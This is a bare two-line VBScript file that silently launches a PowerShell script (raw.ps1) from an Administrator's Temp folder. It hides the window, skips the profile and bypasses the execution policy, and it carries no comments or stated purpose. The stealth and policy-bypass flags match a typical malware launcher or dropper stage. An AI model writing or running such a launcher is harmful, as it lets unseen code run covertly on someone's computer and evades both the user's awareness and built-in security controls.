Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Temp\raw.ps1", 0, False